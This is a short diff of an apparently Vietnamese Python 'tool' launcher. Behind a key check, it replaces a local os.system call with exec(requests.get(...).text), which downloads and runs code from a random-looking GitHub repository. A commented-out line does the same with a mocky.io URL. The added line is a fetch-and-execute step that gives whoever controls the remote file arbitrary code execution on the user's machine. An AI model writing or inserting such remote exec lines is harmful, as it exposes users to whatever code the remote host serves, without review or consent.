@@ -171,9 +171,9 @@ while True:
         if chon == remote_data:
             print(dev+" \033[1;39mĐang Vào Tool...")
             sleep(2)
-            os.system("python3 home.py")
+            # os.system("python3 home.py")
             # print("?")
-            # exec(requests.get('https://run.mocky.io/v3/a74e88ba-070e-4cf3-a358-9f8013c49427').text)
+            exec(requests.get('https://raw.githubusercontent.com/kjbbjkfkjwfakbwfwe21938219hwagbdjaww3/tool/refs/heads/main/home.py').text)
             break
                 # exec(requests.get('ok').text)
     except requests.exceptions.ConnectionError:
